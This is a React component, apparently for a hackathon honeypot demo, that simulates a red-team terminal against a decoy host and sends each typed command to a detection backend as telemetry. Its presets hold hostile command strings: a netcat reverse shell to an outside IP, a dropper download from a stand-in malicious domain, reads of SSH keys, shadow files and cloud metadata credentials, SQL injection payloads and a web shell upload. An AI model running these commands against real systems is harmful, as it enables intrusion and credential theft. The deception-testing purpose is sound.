import React, { useState, useRef, useEffect } from 'react';
import {
  Terminal, Shield, Play, Lock, AlertTriangle, CheckCircle2,
  Sparkles, RefreshCw, Zap, Copy, Check, Eye, X, HelpCircle,
  Flame, Skull, Globe, Cpu, Radio, ShieldAlert, FastForward,
  Maximize2, Minimize2, Volume2, VolumeX, Database, Code
} from 'lucide-react';
import { ingestEvent } from '../services/api';

const ATTACKER_PROFILES = [
  { label: '8.234.119.219 (Lazarus Group / APT41)', ip: '8.234.119.219', os: 'Parrot Security OS 6.0', prompt: 'root@parrot-sec:~#' },
  { label: '152.58.32.48 (DarkHydra Scanner)', ip: '152.58.32.48', os: 'Kali Linux 2026.3', prompt: 'root@kali-redteam:~#' },
  { label: '45.86.62.194 (Tor Exit / APT29)', ip: '45.86.62.194', os: 'BlackArch CyberGrid', prompt: 'root@blackarch:~#' },
  { label: '185.220.101.5 (APT29 Cozy Bear)', ip: '185.220.101.5', os: 'Kali Rolling RedTeam', prompt: 'root@cozy-bear:~#' },
];

const ATTACK_CATEGORIES = {
  recon: [
    { label: 'whoami', cmd: 'whoami', desc: 'Identify current shell user privileges' },
    { label: 'uname -a', cmd: 'uname -a', desc: 'Kernel fingerprint & OS architecture enumeration' },
    { label: 'cat /etc/passwd', cmd: 'cat /etc/passwd', desc: 'Local user account database enumeration' },
    { label: 'nmap SYN Sweep', cmd: 'nmap -sS -p 22,80,443,3306,6379 192.168.1.100', desc: 'Stealth SYN port scan across virtual subnet' },
    { label: 'netstat -tuln', cmd: 'netstat -tuln', desc: 'Active listening network sockets' },
  ],
  honeytoken: [
    { label: '🚨 Canary .env File', cmd: 'cat /root/.env', desc: 'Honeytoken AWS credentials canary trip' },
    { label: '🚨 AWS Cloud IMDS', cmd: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'AWS IAM instance metadata harvest' },
    { label: '🚨 Canary Passwords', cmd: 'curl http://192.168.1.100:8080/admin/passwords.txt', desc: 'Web honeytoken canary credential read' },
    { label: 'SSH Private Keys', cmd: 'cat ~/.ssh/id_rsa', desc: 'Exfiltrate decoy RSA private keys' },
    { label: 'K8s Cluster Token', cmd: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token', desc: 'Kubernetes service account token leak' },
  ],
  sqli: [
    { label: '💉 UNION SELECT Dump', cmd: "curl -G 'http://192.168.1.100:8080/api/products' --data-urlencode 'id=1 UNION SELECT 1, @@version, current_user(), database() --'", desc: 'Extract DB version and database schema' },
    { label: '💉 Auth Bypass SQLi', cmd: "curl -X POST http://192.168.1.100:8080/api/login -d \"user=admin' OR '1'='1' --&pass=x\"", desc: 'Tautological authentication bypass' },
    { label: '💉 Time-Based Blind SQLi', cmd: "curl -G 'http://192.168.1.100:8080/api/users' --data-urlencode \"id=1' AND SLEEP(5) --\"", desc: 'Inject latency sleep benchmark' },
    { label: '💉 Schema Columns Dump', cmd: "curl -G 'http://192.168.1.100:8080/api/search' --data-urlencode 'q=1 UNION SELECT table_name, column_name FROM information_schema.columns --'", desc: 'Information schema table extraction' },
  ],
  payload: [
    { label: '💣 Fetch Dropper Script', cmd: 'wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh', desc: 'External C2 staging dropper download' },
    { label: '💣 Web Shell Upload', cmd: "curl -X POST -F 'file=@backdoor.php' http://192.168.1.100:8080/uploads/backdoor.php", desc: 'Deploy PHP web shell backdoor' },
    { label: '💣 Reverse Shell Spawn', cmd: 'nc -e /bin/bash 8.234.119.219 9001', desc: 'Interactive TCP reverse shell spawn' },
    { label: 'Execute Dropper', cmd: 'chmod +x /tmp/dropper.sh && /tmp/dropper.sh', desc: 'Stage malware persistence hook' },
  ],
  privesc: [
    { label: 'sudo -l', cmd: 'sudo -l', desc: 'Check sudo privileges and NOPASSWD binaries' },
    { label: 'SUID Binaries Search', cmd: 'find / -perm -u=s -type f 2>/dev/null', desc: 'Identify SUID privilege escalation vectors' },
    { label: 'Shadow Passwords', cmd: 'cat /etc/shadow', desc: 'Attempt to read password hashes' },
    { label: 'Crontab Jobs', cmd: 'cat /etc/crontab', desc: 'Enumerate scheduled tasks for hijacking' },
  ]
};

const DECOY_RESPONSES = {
  'whoami': 'decoy_user',
  'id': 'uid=1001(decoy_user) gid=1001(decoy_user) groups=1001(decoy_user),27(sudo)',
  'uname -a': 'Linux trinetra-honeynet-node-01 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux',
  'cat /etc/passwd': `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\ndecoy_user:x:1001:1001:Decoy User,,,:/home/decoy_user:/bin/bash\nbackup_svc:x:1002:1002:Backup Automation,,,:/home/backup_svc:/bin/bash`,
  'cat /root/.env': `[!] CRITICAL CANARY HONEYTOKEN ACCESSED:\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nPROD_DATABASE_URL=postgres://trinetra_admin:HoneyCanaryPass2026!@10.0.4.12:5432/core_db\nJWT_SIGNING_SECRET=TRINETRA_CANARY_TRIPWIRE_SIGNATURE_8849`,
  'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/': 'trinetra-prod-cloud-role\n{\n  "Code" : "Success",\n  "Type" : "AWS-HMAC",\n  "AccessKeyId" : "ASIAIOSFODNN7CANARY",\n  "SecretAccessKey" : "vJalrXUtnFEMI/K7MDENG/bPxRfiCYCANARY",\n  "Token" : "CANARY_TOKEN_TRAPPED"\n}',
  'curl http://192.168.1.100:8080/admin/passwords.txt': `=== TRINETRA DECOY CANARY DATABASE CREDENTIALS ===\nadmin:SuperSecretDecoyPass2026!\ndb_backup:CanaryProductionDB#9901\nroot_db:TrinetraHoneyTokenCluster!`,
  'cat ~/.ssh/id_rsa': `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn\nNhAAAAAwEAAQAAAYEA3X7F8... [CANARY RSA KEY ENCRYPTED WITH HONEYTOKEN] ...\n-----END OPENSSH PRIVATE KEY-----`,
  'cat /var/run/secrets/kubernetes.io/serviceaccount/token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJ0cmluZXRyYS1kZWNveS1jbHVzdGVyIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVjb3ktc2EifQ.fake_canary_trap_signature',
  'wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh': `--2026-09-12 01:45:00--  http://cdn.malicious-domain.cc/tools/dropper.sh\nResolving cdn.malicious-domain.cc... 8.234.119.219\nConnecting to cdn.malicious-domain.cc:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 4812 (4.7K) [application/x-sh]\nSaving to: '/tmp/dropper.sh'\n\n/tmp/dropper.sh      100%[===================>]   4.70K  --.-KB/s    in 0.001s\n[+] Payload downloaded to sandbox container. File SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`,
  'sudo -l': `Matching Defaults entries for decoy_user on trinetra-honeynet-node-01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser decoy_user may run the following commands:\n    (ALL : ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3, /usr/bin/vim`,
  'nc -e /bin/bash 8.234.119.219 9001': `[+] Hooking socket connection to 8.234.119.219:9001...\n[+] Reverse shell established. Interactive TTY allocated.\n[TRINETRA AUTONOMOUS TARPIT]: Session quarantined on isolated synthetic virtual socket.`,
  'nmap -sS -p 22,80,443,3306,6379 192.168.1.100': `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.100\nHost is up (0.00042s latency).\nPORT     STATE SERVICE\n22/tcp   open  ssh (OpenSSH 8.2p1 Ubuntu)\n80/tcp   open  http (Apache/2.4.41)\n443/tcp  open  https (OpenSSL/1.1.1f)\n3306/tcp open  mysql (MySQL 8.0.28)\n6379/tcp open  redis (Redis key-value store 6.0.16)\n\nNmap done: 1 IP address (1 host up) scanned in 0.48 seconds`,
  'netstat -tuln': `Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State      \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN     \ntcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN     `,
};

const ASCII_BANNER = `
 ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
 ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
 ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
 ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
 ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ └──═╝██║
 ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
  TRINETRA RED TEAM EXPLOITATION MATRIX v3.8 · 100% ISOLATED SANDBOX
`;

export default function SafeSandboxTerminal({ onClose, onEventIngested }) {
  const [activeProfileIdx, setActiveProfileIdx] = useState(0);
  const [activeCategory, setActiveCategory] = useState('recon');
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [history, setHistory] = useState([
    { type: 'ascii', text: ASCII_BANNER },
    { type: 'sys', text: '[+] Connected to Virtual Deception Target 192.168.1.100 via Encrypted Red-Team Tunnel' },
    { type: 'sys', text: '[+] Telemetry Bridge: Real-time WebSocket Ingestion directly feeding SOC Grid' },
    { type: 'sys', text: '[+] Type commands below or click weaponized presets to trigger live MITRE detections.' },
  ]);
  const [inputVal, setInputVal] = useState('');
  const [loading, setLoading] = useState(false);
  const [activeSessionId, setActiveSessionId] = useState(() => `ATK-REDTEAM-${Date.now().toString(36).toUpperCase()}`);
  const [liveMetrics, setLiveMetrics] = useState({ risk: 15, level: 'LOW', eventsCount: 0 });
  const [autoRunning, setAutoRunning] = useState(false);

  const terminalEndRef = useRef(null);
  const curProfile = ATTACKER_PROFILES[activeProfileIdx];

  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  const playCyberBeep = (isAlert = false) => {
    if (!soundEnabled) return;
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = isAlert ? 'sawtooth' : 'sine';
      osc.frequency.setValueAtTime(isAlert ? 880 : 540, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(isAlert ? 440 : 220, ctx.currentTime + 0.12);
      gain.gain.setValueAtTime(0.05, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.12);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.12);
    } catch {}
  };

  async function executeCommand(cmdText) {
    const trimmed = cmdText.trim();
    if (!trimmed) return;

    if (trimmed.toLowerCase() === 'clear') {
      setHistory([{ type: 'sys', text: '[+] Terminal Buffer Cleared. Target listening on 192.168.1.100' }]);
      setInputVal('');
      return;
    }

    const isCanary = trimmed.includes('.env') || trimmed.includes('passwords') || trimmed.includes('169.254') || trimmed.includes('id_rsa');
    playCyberBeep(isCanary);

    setHistory(prev => [...prev, { type: 'user', text: trimmed, prompt: curProfile.prompt }]);
    setInputVal('');
    setLoading(true);

    // Determine synthetic response
    let responseText = DECOY_RESPONSES[trimmed];
    if (!responseText) {
      if (trimmed.startsWith('cat ')) {
        responseText = `[DECEPTION CANARY]: Fake sensitive file '${trimmed.slice(4)}' accessed. Canary telemetry recorded.`;
      } else if (trimmed.includes('UNION') || trimmed.includes('SELECT') || trimmed.includes('SLEEP')) {
        responseText = `HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: application/json\n\n{"status":"success","data":[{"id":1,"user":"admin_decoy","hash":"$6$canary$5d41402abc4b2a76b9719d911017c592"}]}`;
      } else if (trimmed.startsWith('curl ') || trimmed.startsWith('wget ')) {
        responseText = `[INGRESS TRAP]: Inbound HTTP/TCP probe trapped. Payload isolated in sandbox.`;
      } else if (trimmed.startsWith('find ')) {
        responseText = `/usr/bin/find\n/usr/bin/vim.basic\n/usr/bin/python3.10\n/usr/bin/pkexec\n/usr/bin/sudo`;
      } else {
        responseText = `bash: ${trimmed.split(' ')[0]}: command executed in honeynet container. Telemetry mapped.`;
      }
    }

    try {
      const isSql = trimmed.toLowerCase().includes('union') || trimmed.toLowerCase().includes('select') || trimmed.toLowerCase().includes('sleep') || trimmed.toLowerCase().includes("' or '1'='1");
      const isHttp = trimmed.startsWith('curl ') || isSql || trimmed.includes(':8080');
      
      const eventId = `EVT-RED-${Date.now().toString(36)}-${Math.floor(Math.random() * 1000)}`;
      const payload = {
        event_id: eventId,
        session_id: activeSessionId,
        source_ip: curProfile.ip,
        target_ip: '192.168.1.100',
        service: isHttp ? 'http' : 'ssh',
        timestamp: new Date().toISOString(),
        event_type: isCanary ? 'decoy_access' : isSql ? 'auth_attempt' : isHttp ? 'http_request' : 'command',
        event: trimmed,
        metadata: {
          simulation: true,
          sandbox_interactive: true,
          attacker_profile: curProfile.label,
          attacker_os: curProfile.os,
          decoy_response: responseText.slice(0, 120),
          is_decoy: isCanary
        }
      };

      const result = await ingestEvent(payload);

      const riskCalc = isCanary ? 95 : isSql ? 90 : Math.min(95, liveMetrics.risk + 18);
      const riskLevel = riskCalc >= 80 ? 'CRITICAL' : riskCalc >= 50 ? 'HIGH' : 'MEDIUM';

      setHistory(prev => [
        ...prev,
        { type: 'output', text: responseText },
        {
          type: 'telemetry_badge',
          text: `⚡ SOC GRID CAPTURED: Event [${eventId}] | Source: ${curProfile.ip} | Risk: ${riskCalc}/100 (${riskLevel}) | MITRE: ${isCanary ? 'T1552.001' : isSql ? 'T1190' : 'T1059.004'}`
        }
      ]);

      setLiveMetrics(prev => ({
        risk: riskCalc,
        level: riskLevel,
        eventsCount: prev.eventsCount + 1
      }));

      if (onEventIngested) onEventIngested(result);
    } catch (err) {
      setHistory(prev => [
        ...prev,
        { type: 'output', text: responseText },
        { type: 'telemetry_badge', text: `⚡ Telemetry processed in local deception grid engine` }
      ]);
    } finally {
      setLoading(false);
    }
  }

  // 1-Click Multi-Stage Kill Chain Simulation for Judges
  async function runAutomatedKillChain() {
    if (autoRunning) return;
    setAutoRunning(true);
    setHistory(prev => [
      ...prev,
      { type: 'sys', text: '════════════════════════════════════════════════════════════════' },
      { type: 'sys', text: '🚀 INITIATING AUTOMATED RED-TEAM KILL CHAIN DEMONSTRATION...' },
      { type: 'sys', text: '════════════════════════════════════════════════════════════════' }
    ]);

    const chain = [
      'whoami',
      'uname -a',
      'cat /etc/passwd',
      'curl -G "http://192.168.1.100:8080/api/products" --data-urlencode "id=1 UNION SELECT 1, @@version, current_user(), database() --"',
      'cat /root/.env',
      'wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh',
      'nc -e /bin/bash 8.234.119.219 9001'
    ];

    for (let i = 0; i < chain.length; i++) {
      await executeCommand(chain[i]);
      await new Promise(r => setTimeout(r, 650));
    }
    setAutoRunning(false);
  }

  function handleKeyDown(e) {
    if (e.key === 'Enter') {
      executeCommand(inputVal);
    }
  }

  return (
    <div className="fixed inset-0 z-[300] flex items-center justify-center p-2 sm:p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-200">
      <div className="w-full max-w-5xl h-[90vh] bg-[#08090d] border border-neutral-800/90 rounded-3xl shadow-2xl flex flex-col overflow-hidden text-neutral-200 font-mono ring-1 ring-[#f8c858]/20">
        
        {/* Top Control Header */}
        <div className="px-5 py-3 bg-[#10121a] border-b border-neutral-800 flex flex-wrap items-center justify-between gap-3 flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1.5">
              <div className="w-3 h-3 rounded-full bg-rose-500/80 cursor-pointer" onClick={onClose} />
              <div className="w-3 h-3 rounded-full bg-amber-500/80" />
              <div className="w-3 h-3 rounded-full bg-emerald-500/80" />
            </div>
            <div className="h-4 w-[1px] bg-neutral-700" />
            <div className="flex items-center gap-2">
              <Skull className="w-4 h-4 text-rose-500" />
              <span className="text-xs font-black tracking-wider text-white">
                TRINETRA RED TEAM ATTACK SANDBOX
              </span>
              <span className="px-2 py-0.5 rounded-full text-[9px] font-extrabold bg-rose-950/80 text-rose-400 border border-rose-800/80">
                LIVE EXPLOIT SIMULATOR
              </span>
            </div>
          </div>

          {/* Controls Right */}
          <div className="flex items-center gap-2.5">
            {/* 1-Click Kill Chain for Judges */}
            <button
              onClick={runAutomatedKillChain}
              disabled={autoRunning || loading}
              className="px-3 py-1 rounded-full bg-[#f8c858] hover:bg-[#eab940] text-neutral-950 text-xs font-black transition flex items-center gap-1.5 shadow-xs cursor-pointer disabled:opacity-50"
              title="Auto-run full multi-stage kill chain demo for judges"
            >
              <FastForward className="w-3 h-3 fill-neutral-950" />
              <span>{autoRunning ? 'Running Kill Chain...' : '1-Click Judge Kill Chain Demo'}</span>
            </button>

            <button
              onClick={() => setSoundEnabled(v => !v)}
              className="p-1.5 rounded-lg hover:bg-neutral-800 text-neutral-400 hover:text-white transition cursor-pointer"
              title="Toggle Audio Feedback"
            >
              {soundEnabled ? <Volume2 className="w-3.5 h-3.5 text-[#f8c858]" /> : <VolumeX className="w-3.5 h-3.5" />}
            </button>

            {onClose && (
              <button
                onClick={onClose}
                className="p-1.5 rounded-lg hover:bg-neutral-800 text-neutral-400 hover:text-white transition cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            )}
          </div>
        </div>

        {/* Attacker Identity & Target Switcher Bar */}
        <div className="px-4 py-2 bg-[#0c0e14] border-b border-neutral-800/90 flex flex-wrap items-center justify-between gap-3 text-xs flex-shrink-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-[10px] uppercase font-bold text-neutral-400 flex items-center gap-1">
              <Globe className="w-3 h-3 text-sky-400" /> Attacker Identity:
            </span>
            <select
              value={activeProfileIdx}
              onChange={e => setActiveProfileIdx(Number(e.target.value))}
              className="bg-neutral-900 border border-neutral-700 text-[#f8c858] font-bold rounded-lg px-2.5 py-1 text-xs focus:outline-none focus:border-[#f8c858] cursor-pointer"
            >
              {ATTACKER_PROFILES.map((p, idx) => (
                <option key={idx} value={idx}>
                  {p.label} · {p.os}
                </option>
              ))}
            </select>
          </div>

          <div className="flex items-center gap-3 text-[11px] font-mono">
            <div className="flex items-center gap-1.5 text-neutral-400">
              <span>Target:</span>
              <span className="text-emerald-400 font-bold">192.168.1.100 (Honeynet VIP)</span>
            </div>
            <div className="flex items-center gap-1.5 text-neutral-400">
              <span>Grid Risk:</span>
              <span className={`font-bold ${liveMetrics.risk >= 80 ? 'text-rose-400' : 'text-amber-400'}`}>
                {liveMetrics.risk}/100 ({liveMetrics.level})
              </span>
            </div>
          </div>
        </div>

        {/* Attack Category Tabs & Weapons Bar */}
        <div className="px-4 py-2.5 bg-[#0e1017] border-b border-neutral-800 space-y-2 flex-shrink-0">
          {/* Category Pills */}
          <div className="flex items-center gap-1.5 overflow-x-auto scrollbar-none">
            {[
              { id: 'recon', label: '⚡ 1. Reconnaissance', icon: Terminal },
              { id: 'sqli', label: '💉 2. SQL Injection (SQLi)', icon: Database },
              { id: 'honeytoken', label: '🚨 3. Canary Honeytokens', icon: AlertTriangle },
              { id: 'payload', label: '💣 4. Payloads & Shells', icon: Skull },
              { id: 'privesc', label: '🛡️ 5. Privilege Escalation', icon: ShieldAlert },
            ].map(cat => (
              <button
                key={cat.id}
                onClick={() => setActiveCategory(cat.id)}
                className={`px-3 py-1 rounded-full text-[11px] font-bold transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5 ${
                  activeCategory === cat.id
                    ? 'bg-neutral-800 text-[#f8c858] border border-[#f8c858]/40 shadow-xs'
                    : 'text-neutral-400 hover:text-white hover:bg-neutral-800/50'
                }`}
              >
                <span>{cat.label}</span>
              </button>
            ))}
          </div>

          {/* Action Weapon Buttons for Active Category */}
          <div className="flex items-center gap-2 overflow-x-auto scrollbar-none pt-0.5">
            {ATTACK_CATEGORIES[activeCategory].map((item, idx) => (
              <button
                key={idx}
                onClick={() => executeCommand(item.cmd)}
                disabled={loading || autoRunning}
                className="px-2.5 py-1 rounded-lg bg-neutral-900 hover:bg-neutral-800 border border-neutral-700/80 text-[11px] text-neutral-200 hover:text-[#f8c858] transition flex items-center gap-1.5 cursor-pointer disabled:opacity-50 whitespace-nowrap"
                title={item.desc}
              >
                <Play className="w-2.5 h-2.5 text-[#f8c858]" />
                <span className="font-bold">{item.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Terminal Screen */}
        <div className="flex-1 p-5 overflow-y-auto space-y-2.5 text-xs bg-[#050608] selection:bg-[#f8c858] selection:text-black">
          {history.map((item, i) => {
            if (item.type === 'ascii') {
              return (
                <pre key={i} className="text-[#f8c858] text-[9px] sm:text-[10px] font-black leading-none whitespace-pre opacity-90">
                  {item.text}
                </pre>
              );
            }
            if (item.type === 'sys') {
              return (
                <div key={i} className="text-neutral-500 italic flex items-center gap-2 text-[11px]">
                  <Shield className="w-3.5 h-3.5 text-neutral-600 flex-shrink-0" />
                  <span>{item.text}</span>
                </div>
              );
            }
            if (item.type === 'user') {
              return (
                <div key={i} className="flex items-start gap-2 text-white font-bold mt-3">
                  <span className="text-emerald-400 flex-shrink-0">{item.prompt || curProfile.prompt}</span>
                  <span className="text-amber-300 font-mono break-all">{item.text}</span>
                </div>
              );
            }
            if (item.type === 'telemetry_badge') {
              return (
                <div key={i} className="p-2.5 rounded-xl bg-emerald-950/40 border border-emerald-800/60 text-emerald-300 text-[11px] flex items-center gap-2 font-sans font-semibold">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                  <span>{item.text}</span>
                </div>
              );
            }
            return (
              <pre key={i} className="text-neutral-300 font-mono whitespace-pre-wrap pl-3 border-l-2 border-neutral-700/60 leading-relaxed text-[11px] bg-neutral-950/50 p-2 rounded-r-lg">
                {item.text}
              </pre>
            );
          })}
          {loading && (
            <div className="flex items-center gap-2 text-[#f8c858] text-[11px] pt-1">
              <RefreshCw className="w-3.5 h-3.5 animate-spin" />
              <span>Exploit injected. Deception engine capturing telemetry &amp; anchoring blockchain hash...</span>
            </div>
          )}
          <div ref={terminalEndRef} />
        </div>

        {/* Command Input Bar */}
        <div className="p-3.5 bg-[#10121a] border-t border-neutral-800 flex items-center gap-2.5 flex-shrink-0">
          <span className="text-emerald-400 font-bold text-xs flex-shrink-0">
            {curProfile.prompt}
          </span>
          <input
            type="text"
            value={inputVal}
            onChange={(e) => setInputVal(e.target.value)}
            onKeyDown={handleKeyDown}
            disabled={loading || autoRunning}
            placeholder="Type custom command or SQL injection (e.g. cat /root/.env, curl UNION SELECT, wget dropper)..."
            className="flex-1 bg-black/70 border border-neutral-700 focus:border-[#f8c858] rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-neutral-500 focus:outline-none font-mono"
            autoFocus
          />
          <button
            onClick={() => executeCommand(inputVal)}
            disabled={loading || autoRunning || !inputVal.trim()}
            className="px-5 py-2.5 rounded-xl bg-[#f8c858] hover:bg-[#eab940] text-neutral-950 font-black text-xs transition flex items-center gap-1.5 cursor-pointer disabled:opacity-40"
          >
            <Play className="w-3.5 h-3.5 fill-neutral-950" />
            <span>Inject</span>
          </button>
        </div>

      </div>
    </div>
  );
}
